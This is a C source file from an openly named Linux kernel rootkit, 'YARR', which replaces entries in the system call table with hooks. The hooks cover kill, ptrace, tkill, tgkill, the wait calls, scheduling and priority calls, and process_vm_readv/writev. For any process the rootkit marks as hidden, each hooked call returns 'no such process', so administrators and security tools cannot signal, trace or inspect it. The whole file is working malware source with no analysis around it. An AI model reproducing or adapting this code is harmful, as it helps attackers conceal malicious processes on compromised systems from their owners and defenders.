/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/resource.h>
#include <linux/ioprio.h>

#include "syscallhooks.h"
#include "hook.h"
#include "debug.h"
#include "hideproc.h"

// TODO: This is a fuck up. Each kernel flavour can has its own number of
// syscalls. The one where I'm working right now has 349, so there are 349
// NULL-initialized positions (minus the hooked syscalls). But what will
// happen with a kernel with a different amount of syscalls? Hu-ah! solve it
// yourself :).

/*
 * Here we declare all the system calls that we will capture. This array has
 * as many positions as syscalls are in the kernel. Each position has NULL or
 * a function address. During yarr initialization if the position in this
 * table is non-null then the corresponding syscall is hooked.
 *
 * Whenever a new hook is developed you should substitute the corresponding
 * position with the address of your hook function. Take care, you will suffer
 * if you change a wrong NULL xDD.
 */
void *syscalls_hooks[NR_syscalls] = {
	NULL, // 0
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 5
	NULL,
	NULL,//yarr_waitpid, // Buggy, check commentaries.
	NULL,
	NULL,
	NULL, // 10
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 15
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_getpid, // 20
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 25
	yarr_ptrace,
	NULL,
	NULL,
	NULL,
	NULL, // 30
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 35
	NULL,
	yarr_kill,
	NULL,
	NULL,
	NULL, // 40
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 45
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 50
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 55
	NULL,
	yarr_setpgid,
	NULL,
	NULL,
	NULL, // 60
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 65
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 70
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 75
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 80
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 85
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 90
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 95
	yarr_getpriority,
	yarr_setpriority,
	NULL,
	NULL,
	NULL, // 100
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 105
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 110
	NULL,
	NULL,
	NULL,
	NULL,//yarr_wait4,
	NULL, // 115
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 120
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 125
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 130
	NULL,
	yarr_getpgid,
	NULL,
	NULL,
	NULL, // 135
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 140
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 145
	NULL,
	yarr_getsid,
	NULL,
	NULL,
	NULL, // 150
	NULL,
	NULL,
	NULL,
	yarr_sched_setparam,
	yarr_sched_getparam, // 155
	yarr_sched_setscheduler,
	yarr_sched_getscheduler,
	NULL,
	NULL,
	NULL, // 160
	yarr_sched_rr_get_interval,
	NULL,
	NULL,
	NULL,
	NULL, // 165
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 170
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 175
	NULL,
	NULL,
	yarr_rt_sigqueueinfo,
	NULL,
	NULL, // 180
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 185
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 190
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 195
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 200
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 205
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 210
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 215
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 220
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 225
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 230
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 235
	NULL,
	NULL,
	yarr_tkill,
	NULL,
	NULL, // 240
	yarr_sched_setaffinity,
	yarr_sched_getaffinity,
	NULL,
	NULL,
	NULL, // 245
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 250
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 255
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 260
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 265
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_tgkill, // 270
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 275
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 280
	NULL,
	NULL,
	yarr_waitid,
	NULL,
	NULL, // 285
	NULL,
	NULL,
	NULL,
	yarr_ioprio_set,
	yarr_ioprio_get, // 290
	NULL,
	NULL,
	NULL,
	yarr_migrate_pages,
	NULL, // 295
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 300
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 305
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 310
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 315
	NULL,
	yarr_move_pages,
	NULL,
	NULL,
	NULL, // 320
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 325
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 330
	NULL,
	NULL,
	NULL,
	NULL,
	yarr_rt_tgsigqueueinfo, // 335
	yarr_perf_event_open,
	NULL,
	NULL,
	NULL,
	yarr_prlimit64, // 340
	NULL,
	NULL,
	NULL,
	NULL,
	NULL, // 345
	NULL,
	yarr_process_vm_readv,
	yarr_process_vm_writev
};



// TODO: Here we have an important bug. When rmmod is called the parent task
// (usually bash) call waitpid to wait for rmmod, so since sys_waitpid is
// hooked by yarr_waitpid it executes this code and stops here, then rmmod
// triggers all the logic of cleaning these hooks so yarr_waitpid is remove
// (that means, its code dissapears from kernel), then rmmod finish and its
// parent will awake and will try to keep executing the code at yarr_waitpid so
// it incurs into an oops kernel paging request. The good news is that this
// will only affect the parent of rmmod :), the rest of task will be fine...
// well that's not completely true, if there was another task executing
// yarr_waitpid it will incur in this bug too... right now I don't care :D.
asmlinkage long yarr_waitpid(pid_t pid, int __user *stat_addr, int options) {
	asmlinkage long (*sys_waitpid)(pid_t, int __user *, int);

	debug("yarr_waitpid() called.\n");
	sys_waitpid = sys_call_table_backup[__NR_waitpid];
	return sys_waitpid(pid, stat_addr, options);
}

asmlinkage long yarr_getpid() {
	asmlinkage long (*sys_getpid)(void);

	debug("yarr_getpid() called.\n");
	sys_getpid = sys_call_table_backup[__NR_getpid];
	return sys_getpid();
}

asmlinkage long yarr_kill(int pid, int sig) {
	asmlinkage long (*sys_kill)(int, int);
	int ret = -ESRCH;

	debug("yarr_kill() called.\n");
	sys_kill = sys_call_table_backup[__NR_kill];

	// Call sys_kill if the task isn't hide.
	if (!isProcHidden(pid))
		ret = sys_kill(pid, sig);

	return ret;
}

asmlinkage long yarr_ptrace(long request, long pid, unsigned long addr,
							unsigned long data) {
	asmlinkage long (*sys_ptrace)(long, long, unsigned long, unsigned long);
	int ret = -ESRCH;

	debug("yarr_ptrace() called.\n");
	sys_ptrace = sys_call_table_backup[__NR_ptrace];

	if (!isProcHidden(pid))
		ret = sys_ptrace(request, pid, addr, data);

	return ret;
}

asmlinkage long yarr_setpgid(pid_t pid, pid_t pgid) {
	asmlinkage long (*sys_setpgid)(pid_t, pid_t);
	int ret = -ESRCH;

	debug("yarr_setpgid() called.\n");
	sys_setpgid = sys_call_table_backup[__NR_setpgid];

	if (!isProcHidden(pid))
		ret = sys_setpgid(pid, pgid);

	return ret;
}

asmlinkage long yarr_getpriority(int which, int who) {
	asmlinkage long (*sys_getpriority)(int, int);
	int ret = -ESRCH;

	debug("yarr_getpriority() called.\n");
	sys_getpriority = sys_call_table_backup[__NR_getpriority];

	if (which != PRIO_PROCESS || !isProcHidden(who))
		ret = sys_getpriority(which, who);

	return ret;
}

asmlinkage long yarr_setpriority(int which, int who, int niceval) {
	asmlinkage long (*sys_setpriority)(int, int, int);
	int ret = -ESRCH;

	debug("yarr_setpriority() called.\n");
	sys_setpriority = sys_call_table_backup[__NR_setpriority];

	if (which != PRIO_PROCESS || !isProcHidden(who))
		ret = sys_setpriority(which, who, niceval);

	return ret;
}

// TODO: Not checked but I guess this is as buggy as yarr_waitpid :).
asmlinkage long yarr_wait4(pid_t pid, int __user *stat_addr, int options,
						   struct rusage __user *ru) {
	asmlinkage long (*sys_wait4)(pid_t, int __user *, int, struct rusage *);
	int ret = -ESRCH;

	debug("yarr_wait4() called.\n");
	sys_wait4 = sys_call_table_backup[__NR_wait4];

	if (!isProcHidden(pid))
		ret = sys_wait4(pid, stat_addr, options, ru);

	return ret;
}

asmlinkage long yarr_getpgid(pid_t pid) {
	asmlinkage long (*sys_getpgid)(pid_t);
	int ret = -ESRCH;

	debug("yarr_getpgid() called.\n");
	sys_getpgid = sys_call_table_backup[__NR_getpgid];

	if (!isProcHidden(pid))
		ret = sys_getpgid(pid);

	return ret;
}

asmlinkage long yarr_getsid(pid_t pid) {
	asmlinkage long (*sys_getsid)(pid_t);
	int ret = -ESRCH;

	debug("yarr_getsid() called.\n");
	sys_getsid = sys_call_table_backup[__NR_getsid];

	if (!isProcHidden(pid))
		ret = sys_getsid(pid);

	return ret;
}

asmlinkage long yarr_sched_setparam(pid_t pid,
									struct sched_param __user *param) {
	asmlinkage long (*sys_sched_setparam)(pid_t, struct sched_param __user *);
	int ret = -ESRCH;

	debug("yarr_sched_setparam() called.\n");
	sys_sched_setparam = sys_call_table_backup[__NR_sched_setparam];

	if (!isProcHidden(pid))
		ret = sys_sched_setparam(pid, param);

	return ret;
}

asmlinkage long yarr_sched_getparam(pid_t pid,
									struct sched_param __user *param) {
	asmlinkage long (*sys_sched_getparam)(pid_t, struct sched_param __user *);
	int ret = -ESRCH;

	debug("yarr_sched_getparam() called.\n");
	sys_sched_getparam = sys_call_table_backup[__NR_sched_getparam];

	if (!isProcHidden(pid))
		ret = sys_sched_getparam(pid, param);

	return ret;
}

asmlinkage long yarr_sched_setscheduler(pid_t pid, int policy,
										struct sched_param __user *param) {
	asmlinkage long (*sys_sched_setscheduler)(pid_t, int,
											  struct sched_param __user *);
	int ret = -ESRCH;

	debug("yarr_sched_setscheduler() called.\n");
	sys_sched_setscheduler = sys_call_table_backup[__NR_sched_setscheduler];

	if (!isProcHidden(pid))
		ret = sys_sched_setscheduler(pid, policy, param);

	return ret;
}

asmlinkage long yarr_sched_getscheduler(pid_t pid) {
	asmlinkage long (*sys_sched_getscheduler)(pid_t);
	int ret = -ESRCH;

	debug("yarr_sched_getscheduler() called.\n");
	sys_sched_getscheduler = sys_call_table_backup[__NR_sched_getscheduler];

	if (!isProcHidden(pid))
		ret = sys_sched_getscheduler(pid);

	return ret;
}

asmlinkage long yarr_sched_rr_get_interval(pid_t pid,
										   struct timespec __user *interval) {
	asmlinkage long (*sys_sched_rr_get_interval)(pid_t,
												 struct timespec __user *);
	int ret = -ESRCH;

	debug("yarr_sched_rr_get_interval() called.\n");
	sys_sched_rr_get_interval = sys_call_table_backup[__NR_sched_rr_get_interval];

	if (!isProcHidden(pid))
		ret = sys_sched_rr_get_interval(pid, interval);

	return ret;
}

asmlinkage long yarr_rt_sigqueueinfo(int pid, int sig,
									 siginfo_t __user *uinfo) {
	asmlinkage long (*sys_rt_sigqueueinfo)(int, int, siginfo_t __user *);
	int ret = -ESRCH;

	debug("yarr_rt_sigqueueinfo() called.\n");
	sys_rt_sigqueueinfo = sys_call_table_backup[__NR_rt_sigqueueinfo];

	if (!isProcHidden(pid))
		ret = sys_rt_sigqueueinfo(pid, sig, uinfo);

	return ret;
}

asmlinkage long yarr_tkill(pid_t pid, int sig) {
	asmlinkage long (*sys_tkill)(pid_t, int);
	int ret = -ESRCH;

	debug("yarr_rt_tkill() called.\n");
	sys_tkill = sys_call_table_backup[__NR_tkill];

	if (!isProcHidden(pid))
		ret = sys_tkill(pid, sig);

	return ret;
}

asmlinkage long yarr_sched_setaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr) {
	asmlinkage long (*sys_sched_setaffinity)(int, unsigned int,
											 unsigned long __user *);
	int ret = -ESRCH;

	debug("yarr_sched_setaffinity() called.\n");
	sys_sched_setaffinity = sys_call_table_backup[__NR_sched_setaffinity];

	if (!isProcHidden(pid))
		ret = sys_sched_setaffinity(pid, len, user_mask_ptr);

	return ret;
}

asmlinkage long yarr_sched_getaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr) {
	asmlinkage long (*sys_sched_getaffinity)(int, unsigned int,
											 unsigned long __user *);
	int ret = -ESRCH;

	debug("yarr_sched_getaffinity() called.\n");
	sys_sched_getaffinity = sys_call_table_backup[__NR_sched_getaffinity];

	if (!isProcHidden(pid))
		ret = sys_sched_getaffinity(pid, len, user_mask_ptr);

	return ret;
}

// TODO: How thread groups works should be studied, then implement this with
// a bit of conciousness, knowing what tgid (thread group id) means and so on.
asmlinkage long yarr_tgkill(int tgid, int pid, int sig) {
	asmlinkage long (*sys_tgkill)(int, int, int);
	int ret = -ESRCH;

	debug("yarr_tgkill() called.\n");
	sys_tgkill = sys_call_table_backup[__NR_tgkill];

	if (!isProcHidden(pid))
		ret = sys_tgkill(tgid, pid, sig);

	return ret;
}

// TODO: Another wait syscall, another buggy syscall...
asmlinkage long yarr_waitid(int which, pid_t pid, struct siginfo __user *infop,
							int options, struct rusage __user *ru) {
	asmlinkage long (*sys_waitid)(int, pid_t, struct siginfo __user *, int,
								  struct rusage __user *);
	int ret = -ESRCH;

	debug("yarr_waitid() called.\n");
	sys_waitid = sys_call_table_backup[__NR_waitid];

	if (!isProcHidden(pid))
		ret = sys_waitid(which, pid, infop, options, ru);

	return ret;
}

asmlinkage long yarr_ioprio_set(int which, int who, int ioprio) {
	asmlinkage long (*sys_ioprio_set)(int, int, int);
	int ret = -ESRCH;

	debug("yarr_ioprio_set() called.\n");
	sys_ioprio_set = sys_call_table_backup[__NR_ioprio_set];

	if (which != IOPRIO_WHO_PROCESS || !isProcHidden(who))
		ret = sys_ioprio_set(which, who, ioprio);

	return ret;
}

asmlinkage long yarr_ioprio_get(int which, int who, int ioprio) {
	asmlinkage long (*sys_ioprio_get)(int, int, int);
	int ret = -ESRCH;

	debug("yarr_ioprio_get() called.\n");
	sys_ioprio_get = sys_call_table_backup[__NR_ioprio_get];

	if (which != IOPRIO_WHO_PROCESS || !isProcHidden(who))
		ret = sys_ioprio_get(which, who, ioprio);

	return ret;
}

asmlinkage long yarr_migrate_pages(pid_t pid, unsigned long maxnode,
								   const unsigned long __user *from,
								   const unsigned long __user *to) {
	asmlinkage long (*sys_migrate_pages)(pid_t, unsigned long,
									  const unsigned long __user *,
									  const unsigned long __user *);
	int ret = -ESRCH;

	debug("yarr_migrate_pages() called.\n");
	sys_migrate_pages = sys_call_table_backup[__NR_migrate_pages];

	if (!isProcHidden(pid))
		ret = sys_migrate_pages(pid, maxnode, from, to);

	return ret;
}

asmlinkage long yarr_move_pages(pid_t pid, unsigned long nr_pages,
								const void __user * __user *pages,
								const int __user *nodes,
								int __user *status, int flags) {
	asmlinkage long (*sys_move_pages)(pid_t, unsigned long,
									  const void __user * __user *,
									  const int __user *, int __user *, int);
	int ret = -ESRCH;

	debug("yarr_move_pages() called.\n");
	sys_move_pages = sys_call_table_backup[__NR_move_pages];

	if (!isProcHidden(pid))
		ret = sys_move_pages(pid, nr_pages, pages, nodes, status, flags);

	return ret;
}

// TODO: Another syscall that deals with thread groups. Study this concept and
// reimplement it (or at least verify it).
asmlinkage long yarr_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
									   siginfo_t __user *uinfo) {
	asmlinkage long (*sys_rt_tgsigqueueinfo)(pid_t, pid_t, int,
											 siginfo_t __user *);
	int ret = -ESRCH;

	debug("yarr_rt_tgsigqueueinfo() called.\n");
	sys_rt_tgsigqueueinfo = sys_call_table_backup[__NR_rt_tgsigqueueinfo];

	if (!isProcHidden(pid))
		ret = sys_rt_tgsigqueueinfo(tgid, pid, sig, uinfo);

	return ret;
}

asmlinkage long yarr_perf_event_open(struct perf_event_attr __user *attr_uptr,
									 pid_t pid, int cpu, int group_fd,
									 unsigned long flags) {
	asmlinkage long (*sys_perf_event_open)(struct perf_event_attr __user *,
										   pid_t, int, int, unsigned long);
	int ret = -ESRCH;

	debug("yarr_perf_event_open() called.\n");
	sys_perf_event_open = sys_call_table_backup[__NR_perf_event_open];

	if (!isProcHidden(pid))
		ret = sys_perf_event_open(attr_uptr, pid, cpu, group_fd, flags);

	return ret;
}

asmlinkage long yarr_prlimit64(pid_t pid, unsigned int resource,
							   const struct rlimit64 __user *new_rlim,
							   struct rlimit64 __user *old_rlim) {
	asmlinkage long (*sys_prlimit64)(pid_t, unsigned int,
									 const struct rlimit64 __user *,
									 struct rlimit64 __user *);
	int ret = -ESRCH;

	debug("yarr_prlimit64() called.\n");
	sys_prlimit64 = sys_call_table_backup[__NR_prlimit64];

	if (!isProcHidden(pid))
		ret = sys_prlimit64(pid, resource, new_rlim, old_rlim);

	return ret;
}

asmlinkage long yarr_process_vm_readv(pid_t pid,
									  const struct iovec __user *lvec,
									  unsigned long liovcnt,
									  const struct iovec __user *rvec,
									  unsigned long riovcnt,
									  unsigned long flags) {
	asmlinkage long (*sys_process_vm_readv)(pid_t,
											const struct iovec __user *,
											unsigned long,
											const struct iovec __user *,
											unsigned long,
											unsigned long);
	int ret = -ESRCH;

	debug("yarr_process_vm_readv() called.\n");
	sys_process_vm_readv = sys_call_table_backup[__NR_process_vm_readv];

	if (!isProcHidden(pid))
		ret = sys_process_vm_readv(pid, lvec, liovcnt, rvec, riovcnt, flags);

	return ret;
}

asmlinkage long yarr_process_vm_writev(pid_t pid,
									   const struct iovec __user *lvec,
									   unsigned long liovcnt,
									   const struct iovec __user *rvec,
									   unsigned long riovcnt,
									   unsigned long flags) {
	asmlinkage long (*sys_process_vm_writev)(pid_t,
											 const struct iovec __user *,
											 unsigned long,
											 const struct iovec __user *,
											 unsigned long,
											 unsigned long);
	int ret = -ESRCH;

	debug("yarr_process_vm_writev() called.\n");
	sys_process_vm_writev = sys_call_table_backup[__NR_process_vm_writev];

	if (!isProcHidden(pid))
		ret = sys_process_vm_writev(pid, lvec, liovcnt, rvec, riovcnt, flags);

	return ret;
}

